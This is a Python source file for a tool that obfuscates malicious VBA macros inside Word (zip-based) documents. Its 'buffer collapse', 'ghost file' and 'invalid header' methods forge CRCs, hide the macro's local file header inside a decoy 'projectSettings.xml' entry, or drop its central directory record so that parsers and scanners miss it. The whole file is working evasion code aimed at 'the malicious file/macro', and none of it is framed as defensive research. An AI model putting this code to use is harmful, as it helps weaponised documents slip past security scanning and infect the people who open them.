#!/usr/bin/env python3

import zipfile
from random import randrange


class Obfuscator:
    """Class to hold a file to perform obfuscation techniques on.

    Upon initialization, the raw bytes of the file will be retrieved and stored, and relevant metadata determined
    (So input file can be deleted after class initialization)

    Methods for caller:

    get_obfuscated(obfuscation_method)
        Calling this method on the object will return the obfuscated version of the stored file,
        using the specified technique.
        The method can be called multiple times on the same object to return multiple obfuscated outputs.

    """
    def __init__(self, filename):
        self.filename = filename
        # f = open(self.filename, "rb")
        with open(self.filename, "rb") as f:
            self.rawbytes = f.read()
        self.metadata = {}
        self.metadata['CDFH_offsets'] = self.get_CDFH_offsets()
        self.metadata['LFH_offsets'] = self.get_LFH_offsets()
        self.metadata['end_of_CDFH_offset'] = self.get_end_of_CDFH_offset()

    def get_obfuscated(self, obfuscation_method):
        if obfuscation_method == 'buffer_collapse':
            return self.obfuscate_collapse()
        elif obfuscation_method == 'ghost_file':
            return self.obfuscate_ghost()
        elif obfuscation_method == 'invalid_header':
            return self.obfuscate_IH()
        elif obfuscation_method == 'invalid_plus_ghost':
            self.rawbytes = self.obfuscate_ghost()
            return self.obfuscate_IH()
        elif obfuscation_method == 'invalid_plus_buffer':
            self.rawbytes = self.obfuscate_IH()
            return self.obfuscate_collapse()

    def get_CDFH_offsets(self):
        """Get the offsets to the Central Directory File Headers for each contained file.
        Returns a list of tuples [offset_to_CDFH_header, filename]

        """
        rawbytes = self.rawbytes
        offsets = []

        CDFH_magic = b'\x50\x4b\x01\x02'
        filename_len_offset = 28
        filename_offset = 46
        start_ind = 0
        while (start_ind < len(rawbytes)):
            if rawbytes[start_ind:].find(CDFH_magic) == -1:
                break
            else:
                CDFH_magic_ind = start_ind + rawbytes[start_ind:].find(CDFH_magic)
            filename_len = int.from_bytes(
                rawbytes[CDFH_magic_ind + filename_len_offset:CDFH_magic_ind + filename_len_offset + 2], "little")
            filename_ind = CDFH_magic_ind + filename_offset
            filename = rawbytes[filename_ind:filename_ind + filename_len].decode('latin-1')
            offsets.append([CDFH_magic_ind, filename])
            start_ind = CDFH_magic_ind + 1

        return offsets

    def get_LFH_offsets(self):
        """Get the offsets to the Local File Headers for each contained file.
        Returns a list of tuples [offset_to_LFH_header, filename, compressed_size_of_file]

        """
        filename = self.filename
        offsets = []

        z = zipfile.ZipFile(filename, "r")
        for filename in z.namelist():
            zi = z.getinfo(filename)
            bt = z.read(filename)
            offsets.append([zi.header_offset, filename, zi.compress_size])
        z.close()
        return offsets

    def get_end_of_CDFH_offset(self):
        """Find the offset for the "End of Central Directory" Header

        """
        end_magic = b'\x50\x4b\x05\x06'
        return self.rawbytes.find(end_magic)

    def obfuscate_collapse(self):
        """Perform "File Buffer Collapsing" obfuscation.

        The Local File Header for the malicious file/macro is embedded within the compressed file
        section of a dummy Local File Header (the dummy "compressed content" in this implementation being a series
        of 40 "B" characters) with a dummy name ("projectSettings.xml"), and random CRC.

        The Central Directory File Headers are all updated to reflect the new dummy header and new offsets (caused
        by the addition of the dummy data).

        Finally, a new Central Directory File Header is created that points to the start of the macro's original
        Local File Header (now embedded within the compressed section of the dummy header "projectSettings.xml")

        Returns the obfuscated raw bytes.

        """
        total_Bs = 40
        metadata = self.metadata
        rawbytes = self.rawbytes

        # find the macro's Local File Header - this offset will be replaced with a dummy Local File Header, and
        # the original macro's LFH will be embedded within the compressed data section
        macro_ind = [i for i, j in enumerate(metadata['LFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
        macro_LFH_offset = metadata['LFH_offsets'][macro_ind][0]
        compressed_size = metadata['LFH_offsets'][macro_ind][2]
        LFH_CRC_offset = 14
        new_outbytes = bytearray(
            rawbytes[:macro_LFH_offset + LFH_CRC_offset])  # Get current buffer up to the CRC spot for the macro
        # add random CRC - 4 random bytes
        random_CRC = randrange(4294967295)  # random from 0 to max int that fits in 4 bytes
        new_outbytes.extend(random_CRC.to_bytes(4, 'little'))
        # add new compressed size
        new_size = compressed_size + total_Bs
        new_outbytes.extend(new_size.to_bytes(4, 'little'))
        lfh_filename_offset = 30
        new_outbytes.extend(bytearray(rawbytes[macro_LFH_offset + LFH_CRC_offset + 8:macro_LFH_offset + lfh_filename_offset]))

        # change filename to something random (same length so we don't have to change File name length)
        new_name = 'projectSettings.xml'
        new_outbytes.extend(bytearray(new_name.encode()))
        next_LFH_offset = metadata['LFH_offsets'][macro_ind + 1][0]
        # check if there was any "extra" section for this LFH
        if next_LFH_offset != (macro_LFH_offset + lfh_filename_offset + len(new_name) + compressed_size):
            print(next_LFH_offset)
            print(macro_LFH_offset + lfh_filename_offset + len(new_name) + compressed_size)
            print('accounting for LFH extra field')
            new_outbytes.extend(
                bytearray(rawbytes[macro_LFH_offset + lfh_filename_offset + len(new_name):next_LFH_offset]))

        # now embed the original compressed macro within Bs
        B_str = "B" * (total_Bs // 2)
        new_outbytes.extend(bytearray(B_str.encode()))
        full_macro_LFH = bytearray(rawbytes[macro_LFH_offset:next_LFH_offset])
        new_outbytes.extend(full_macro_LFH)
        new_outbytes.extend(bytearray(B_str.encode()))

        # add the dummy CRC in the macro's original CDFH entry
        macro_CDFH_offset = metadata['CDFH_offsets'][macro_ind][0]
        cdfh_crc_offset = 16
        new_outbytes.extend(bytearray(rawbytes[next_LFH_offset:macro_CDFH_offset + cdfh_crc_offset]))
        new_outbytes.extend(random_CRC.to_bytes(4, 'little'))

        # need to fix the macro's original CDFH compressed size to account for the Bs (cdfh_compressed_size_offset = 20, so it's right here)
        new_outbytes.extend(new_size.to_bytes(4, 'little'))

        # need to change the original macro filename (word/vbaProject.bin) to the dummy one in CDFH
        cdfh_filename_offset = 46
        new_outbytes.extend(
            bytearray(rawbytes[macro_CDFH_offset + cdfh_crc_offset + 8:macro_CDFH_offset + cdfh_filename_offset]))
        new_outbytes.extend(bytearray(new_name.encode()))

        # now every pointer to LFH for all other files AFTER the original macro's CDFH needs to be offset by the # of Bs we added
        cdfh_pointer_to_LFH_offset = 42
        for i in range(macro_ind + 1, len(metadata['CDFH_offsets'])):
            cdfh_offset = metadata['CDFH_offsets'][i][0]
            new_outbytes.extend(bytearray(rawbytes[cdfh_offset:cdfh_offset + cdfh_pointer_to_LFH_offset]))
            new_LFH_offset = metadata['LFH_offsets'][i][0] + total_Bs
            new_outbytes.extend(new_LFH_offset.to_bytes(4, 'little'))
            # now just extend to the usual end (which may include extra field/file comments)
            if i != len(metadata['CDFH_offsets']) - 1:
                next_cdfh_offset = metadata['CDFH_offsets'][i + 1][0]
                new_outbytes.extend(
                    bytearray(rawbytes[(cdfh_offset + cdfh_pointer_to_LFH_offset + 4):next_cdfh_offset]))
            else:
                # if last CDFH, extend to end of central directory header
                new_outbytes.extend(
                    bytearray(rawbytes[(cdfh_offset + cdfh_pointer_to_LFH_offset + 4):metadata['end_of_CDFH_offset']]))

        # now add in the new CDFH pointing to the embedded macro
        # should be a direct copy of the original macro's CDFH, except with the pointer to LFH modified
        new_outbytes.extend(bytearray(rawbytes[macro_CDFH_offset:macro_CDFH_offset + cdfh_pointer_to_LFH_offset]))
        new_LFH_offset = macro_LFH_offset + (total_Bs // 2)
        new_outbytes.extend(new_LFH_offset.to_bytes(4, 'little'))
        CDFH_after_macro_offset = metadata['CDFH_offsets'][macro_ind + 1][0]
        new_outbytes.extend(
            bytearray(rawbytes[(macro_CDFH_offset + cdfh_pointer_to_LFH_offset + 4):CDFH_after_macro_offset]))

        # Finally, add in the End of Central Directory header
        end_of_central_directory_offset = metadata['end_of_CDFH_offset']
        new_outbytes.extend(bytearray(rawbytes[end_of_central_directory_offset:]))

        return new_outbytes

    def obfuscate_ghost(self):
        """Perform "Ghost File" obfuscation.

        The Local File Header for the malicious file/macro is included normally, but no Central
        Directory File Header entry is added to point to it.

        Returns the obfuscated raw bytes.

        """
        rawbytes = self.rawbytes
        metadata = self.metadata

        macro_CDFH_ind = [i for i, j in enumerate(metadata['CDFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
        macro_CDFH_offset = metadata['CDFH_offsets'][macro_CDFH_ind][0]

        # if the macro's CDFH was not the last one, then skip over it and continue with next CDFH
        if macro_CDFH_ind != len(metadata['CDFH_offsets']) - 1:
            next_CDFH_offset = metadata['CDFH_offsets'][macro_CDFH_ind + 1][0]
            new_outbytes = rawbytes[:macro_CDFH_offset] + rawbytes[next_CDFH_offset:]
        # if it was the last one, then skip over it and continue with the end_of_CDFH
        else:
            new_outbytes = rawbytes[:macro_CDFH_offset] + rawbytes[metadata['end_of_CDFH_offset']:]

        return new_outbytes

    def obfuscate_IH(self):
        """Perform "Invalid File Header" obfuscation.

        The Local File Header for the malicious file/macro is corrupted with an invalid CRC.

        Returns the obfuscated raw bytes.

        """
        rawbytes = self.rawbytes
        metadata = self.metadata

        macro_ind = [i for i, j in enumerate(metadata['LFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
        macro_LFH_offset = metadata['LFH_offsets'][macro_ind][0]

        # add invalid CRC in the LFH - 4 random bytes
        LFH_CRC_offset = 14
        new_outbytes = bytearray(rawbytes[:macro_LFH_offset + LFH_CRC_offset])
        random_CRC = randrange(4294967295)  # random from 0 to max int that fits in 4 bytes
        new_outbytes.extend(random_CRC.to_bytes(4, 'little'))

        # extend to end
        new_outbytes.extend(bytearray(rawbytes[(macro_LFH_offset + LFH_CRC_offset + 4):]))

        return new_outbytes
